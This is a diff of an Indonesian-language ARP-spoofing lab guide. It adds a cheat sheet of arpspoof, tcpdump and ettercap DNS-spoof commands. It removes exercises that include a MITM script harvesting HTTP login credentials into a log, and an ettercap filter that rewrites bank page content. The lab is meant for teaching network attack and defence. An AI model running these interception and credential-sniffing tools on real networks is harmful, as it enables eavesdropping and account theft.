+    if [ "$WEB_MAC" != "$REAL_MAC" ] && [ ! -z "$WEB_MAC" ]; then
+        echo "⚠️  PERINGATAN! ARP SPOOFING TERDETEKSI!"
+    else
+        echo "✅ Status: Aman"
     fi
     
-    sleep 3
+    echo "========================================"
+    sleep 2
 done
-EOF
-
-chmod +x /tmp/check_arp.sh
-/tmp/check_arp.sh
 ```
 
-### 7.2 Deteksi dengan arpwatch
-
+Jalankan di korban:
 ```bash
-# Install arpwatch
-apt install -y arpwatch
-
-# Jalankan monitoring untuk webserver
-arpwatch -i eth0
-
-# Lihat log
-tail -f /var/log/syslog | grep arpwatch
+bash /root/files/monitor.sh
 ```
 
-### 7.3 Pencegahan dengan Static ARP
+### Cheat Sheet dengan IP
 
-**Di target:**
+| Fungsi | Perintah (dengan IP 172.20.0.x) |
+|--------|-------------------------------|
+| Spoof korban | `arpspoof -i eth0 -t 172.20.0.10 172.20.0.20` |
+| Spoof server | `arpspoof -i eth0 -t 172.20.0.20 172.20.0.10` |
+| Sniff HTTP | `tcpdump -i eth0 -A port 80` |
+| DNS Spoof | `ettercap -T -i eth0 -M arp:remote /172.20.0.10// /172.20.0.254// -P dns_spoof` |
+| Akses web asli | `curl http://172.20.0.20` atau browser: `http://localhost:8080` |
+| Akses web palsu | `curl http://172.20.0.30` atau browser: `http://localhost:8081` |
+
+### Cleanup
 ```bash
-# Tambahkan static ARP untuk webserver
-arp -s 192.168.1.200 02:42:c0:a8:01:c8
+# Di penyerang
+killall arpspoof ettercap
+echo 0 > /proc/sys/net/ivp4/ip_forward
 
-# Verifikasi
-arp -n | grep 192.168.1.200
-# Akan ada flag PERMANENT
+# Di terminal utama
+cd ~/lab-arp-kali
+docker-compose down
 ```
 
-### 7.4 Pencegahan dengan HTTPS Lokal
-
-Untuk website lokal, kita bisa gunakan self-signed certificate:
-
-```bash
-# Di webserver, generate sertifikat SSL
-docker-compose exec webserver bash
-apt update && apt install -y openssl
-
-# Generate self-signed certificate
-mkdir -p /etc/ssl/private /etc/ssl/certs
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout /etc/ssl/private/server.key \
-  -out /etc/ssl/certs/server.crt \
-  -subj "/C=ID/ST=Jakarta/L=Jakarta/O=Bank Lokal/CN=bank.local"
-
-# Konfigurasi Apache untuk HTTPS
-a2enmod ssl
-a2ensite default-ssl
-service apache2 restart
-```
-
----
-
-## 8. Latihan Mandiri
-
-### Latihan 1: ARP Spoofing ke Semua Host
-
-```bash
-# Di attacker - spoof semua komunikasi
-arpspoof -i eth0 -t 192.168.1.10 192.168.1.200
-arpspoof -i eth0 -t 192.168.1.200 192.168.1.10
-arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
-
-# Sniff semua traffic
-tcpdump -i eth0 -A
-```
-
-### Latihan 2: Sniffing Form Data
-
-```bash
-# Di attacker, buat filter tcpdump spesifik
-tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
-
-# Ini akan menangkap HTTP POST method saja
-```
-
-### Latihan 3: Script ARP Spoofing dengan Logging
-
-```bash
-cat > /tmp/arp_mitm.sh << 'EOF'
-#!/bin/bash
-
-TARGET="192.168.1.10"
-WEBSERVER="192.168.1.200"
-INTERFACE="eth0"
-LOGFILE="/shared/credentials.log"
-
-cleanup() {
-    echo "Membersihkan..."
-    kill $PID1 $PID2 2>/dev/null
-    echo 0 > /proc/sys/net/ipv4/ip_forward
-    exit
-}
-
-trap cleanup INT
-
-echo "Memulai ARP Spoofing MITM"
-echo "Target: $TARGET -> $WEBSERVER"
-echo "Log: $LOGFILE"
-
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-arpspoof -i $INTERFACE -t $TARGET $WEBSERVER > /dev/null &
-PID1=$!
-arpspoof -i $INTERFACE -t $WEBSERVER $TARGET > /dev/null &
-PID2=$!
-
-# Sniff dan extract password
-tcpdump -i $INTERFACE -A -l port 80 2>/dev/null | while read line; do
-    if echo "$line" | grep -q "POST"; then
-        echo "$(date): POST Request" >> $LOGFILE
-    elif echo "$line" | grep -q "username="; then
-        echo "CRED: $line" >> $LOGFILE
-        echo "$(date): Credential ditemukan - $line"
-    fi
-done
-
-wait
-EOF
-
-chmod +x /tmp/arp_mitm.sh
-/tmp/arp_mitm.sh
-```
-
-### Latihan 4: Ettercap Filter untuk Ganti Konten
-
-```bash
-# Buat filter untuk memodifikasi response
-cat > /tmp/modify.filter << 'EOF'
-if (ip.proto == TCP && tcp.src == 80) {
-    if (search(DATA.data, "Bank Lokal")) {
-        replace("Bank Lokal", "Bank PALSU (DISADAP)");
-        msg("Konten dimodifikasi\n");
-    }
-    if (search(DATA.data, "Login Berhasil")) {
-        replace("Login Berhasil", "Login Diproses... (data dicuri)");
-        msg("Login message dimodifikasi\n");
-    }
-}
-EOF
-
-# Compile
-etterfilter /tmp/modify.filter -o /tmp/modify.ef
-
-# Jalankan
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200// -F /tmp/modify.ef
-```
-
-### Latihan 5: Monitor ARP Table dengan Python
-
-```bash
-cat > /tmp/arp_monitor.py << 'EOF'
-#!/usr/bin/env python3
-import subprocess
-import time
-import sys
-from datetime import datetime
-
-def get_arp():
-    result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
-    lines = result.stdout.strip().split('\n')[1:]
-    
-    arp_table = {}
-    for line in lines:
-        parts = line.split()
-        if len(parts) >= 3:
-            ip = parts[0]
-            mac = parts[2]
-            arp_table[ip] = mac
-    return arp_table
-
-def monitor(interval=2):
-    print(f"Monitoring ARP table setiap {interval} detik")
-    print("-" * 50)
-    
-    prev_arp = get_arp()
-    
-    try:
-        while True:
-            time.sleep(interval)
-            current_arp = get_arp()
-            
-            for ip, mac in current_arp.items():
-                if ip in prev_arp and prev_arp[ip] != mac:
-                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️ PERUBAHAN: {ip}")
-                    print(f"    Sebelum: {prev_arp[ip]}")
-                    print(f"    Sekarang: {mac}")
-            
-            prev_arp = current_arp
-            
-    except KeyboardInterrupt:
-        print("\nMonitoring dihentikan")
-
-if __name__ == "__main__":
-    monitor()
-EOF
-
-python3 /tmp/arp_monitor.py
-```
-
-### Latihan 6: Test dengan HTTP/HTTPS
-
-```bash
-# Di webserver, setup HTTPS sederhana
-cd ~/netsec-lab
-docker-compose exec webserver bash
-
-# Install openssl
-apt update && apt install -y openssl
-
-# Generate self-signed cert
-mkdir -p /etc/apache2/ssl
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout /etc/apache2/ssl/server.key \
-  -out /etc/apache2/ssl/server.crt \
-  -subj "/CN=bank.local"
-
-# Enable SSL
-a2enmod ssl
-a2ensite default-ssl
-
-# Restart Apache
-service apache2 restart
-
-# Test dari target
-curl -k https://192.168.1.200
-```
-
-### Latihan 7: Cleanup Script Lengkap
-
-```bash
-cat > /tmp/cleanup_all.sh << 'EOF'
-#!/bin/bash
-
-echo "Membersihkan semua efek serangan..."
-
-# Matikan proses
-killall arpspoof 2>/dev/null
-killall ettercap 2>/dev/null
-killall tcpdump 2>/dev/null
-
-# Matikan IP forwarding
-for container in kali-attacker router; do
-    docker exec $container sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward" 2>/dev/null
-done
-
-# Bersihkan ARP cache di semua container
-for container in ubuntu-target ubuntu-target2 webserver fake-webserver; do
-    docker exec $container sh -c "ip neigh flush all" 2>/dev/null
-done
-
-# Bersihkan iptables di router
-docker exec router sh -c "iptables -t nat -F" 2>/dev/null
-
-# Hapus file sementara
-rm -f /shared/*.pcap /shared/*.log /tmp/*.ef /tmp/*.filter 2>/dev/null
-
-echo "Selesai! Jaringan kembali normal."
-echo "Catatan: ARP cache akan pulih dalam beberapa menit."
-EOF
-
-chmod +x /tmp/cleanup_all.sh
-/tmp/cleanup_all.sh
-```
-
----
-
-## 9. Troubleshooting
+## Troubleshooting
 
 ### Masalah: Container tidak bisa saling ping
 ```bash
